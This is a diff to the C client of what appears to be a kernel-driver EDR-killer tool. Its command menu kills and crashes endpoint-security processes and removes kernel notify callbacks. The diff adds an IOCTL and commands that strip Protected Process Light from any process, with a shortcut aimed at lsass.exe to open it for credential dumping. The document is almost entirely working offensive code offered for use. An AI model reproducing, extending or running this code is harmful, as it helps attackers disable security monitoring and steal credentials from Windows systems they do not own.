@@ -13,6 +13,7 @@
 
 
 int stop_term_thread = 0;
+int stop_crash_thread = 0;
 
 struct threadArgs {
     HANDLE hDevice;
@@ -39,6 +40,8 @@ struct threadArgs {
 #define IOCTL_REM_REG_CALLBACK CTL_CODE_HIDE(9)
 #define IOCTL_REM_OBJ_CALLBACK CTL_CODE_HIDE(10)
 #define IOCTL_CRASH_PROCESS CTL_CODE_HIDE(11)
+#define IOCTL_PPL_BYPASS CTL_CODE_HIDE(12)
+
 
 
 
@@ -652,6 +655,30 @@ BOOL ElObjCallBack(HANDLE hDevice) {
     return result;
 }
 
+BOOL bypassPPL(HANDLE hDevice, DWORD pid) {
+    DWORD bytesReturned;
+    ModulesData* resultArray = NULL;
+    ULONG64 modulesCount = 0;
+    BOOL result;
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_PPL_BYPASS,
+        &pid,
+        sizeof(DWORD),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+    if (!result) {
+        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully sent request to bypass PPL.\n");
+    }
+    return result;
+}
+
 int main(int argc, char* argv[])
 {
     HANDLE hDevice = CreateFileA(
@@ -665,6 +692,7 @@ int main(int argc, char* argv[])
 
     const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
     HANDLE hTerminateThread;
+	HANDLE hCrashThread;
 
 
     while (1) {
@@ -689,8 +717,8 @@ int main(int argc, char* argv[])
             threadArgs args;
             args.hDevice = hDevice;
             args.mode = 2;
-            hTerminateThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
-            if (hTerminateThread == NULL) {
+            hCrashThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
+            if (hCrashThread == NULL) {
                 fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
                 return 1;
             }
@@ -703,6 +731,10 @@ int main(int argc, char* argv[])
             printf("Stopping termination...\n");
 			stop_term_thread = 1;            
         }
+        else if (strncmp(input, "stopcrash", 9) == 0) {
+            printf("Stopping crashing...\n");
+            stop_crash_thread = 1;
+		}
         else if (strncmp(input, "kill", 4) == 0) {
             DWORD pid = atoi(input + 5);
             if (pid == 0) {
@@ -803,14 +835,43 @@ int main(int argc, char* argv[])
                 printf("Failed to send some requests. Error: %lu\n", GetLastError());
             }
 		}
+        else if (strncmp(input, "bypassppllsass", 14) == 0) {
+            DWORD pid = FindProcessId("lsass.exe");
+            if (pid == 0) {
+                printf("lsass.exe not found.\n");
+                continue;
+            }
+            BOOL result = bypassPPL(hDevice, pid);
+            if (result) {
+                printf("Sent request to bypass PPL for lsass.exe with PID %lu\n", pid);
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+        }
+        else if (strncmp(input, "bypassppl", 9) == 0) {
+            DWORD pid = atoi(input + 10);
+            if (pid == 0) {
+                printf("Invalid PID.\n");
+                continue;
+            }
+            BOOL result = bypassPPL(hDevice, pid);
+            if (result) {
+                printf("Sent request to bypass PPL for process with PID %lu\n", pid);
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+        }
+
         else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
 			printf(" - terminate            - Start killing EDR processes\n");
             printf(" - crashem              - Start crashing EDR processes\n");
 			printf(" - kill <PID>           - Kill a specific process by PID\n");
             printf(" - crash <PID>          - crash a specific process by PID\n");
-			printf(" - exit                 - Exit the program\n");
 			printf(" - stopterm             - Stop killing EDR processes\n");
+			printf(" - stopcrash			- Stop crashing EDR processes\n\n");
             printf(" - listproc             - List process notify routines\n");
             printf(" - listthread           - List thread notify routines\n");
 			printf(" - listloadimage        - List load image notify routines\n");
@@ -821,8 +882,13 @@ int main(int argc, char* argv[])
 			printf(" - elregcallback        - Eliminate registry notify routine callback\n");
 			printf(" - elobjcallback        - Eliminate object notify routine callback\n");
 
-			printf(" - elall                - Eliminate all known EDR callbacks\n");            
-			printf(" - help             - Show this help menu\n");
+			printf(" - elall                - Eliminate all known EDR callbacks\n\n");     
+			printf(" - bypassppl <PID>      - Bypass PPL for a specific process by PID\n");
+			printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe\n");
+			printf(" - help                 - Show this help menu\n");
+            printf(" - exit                 - Exit the program\n");
+
+
         }
         else {
             printf("Unknown command. Available commands: kill, exit\n");
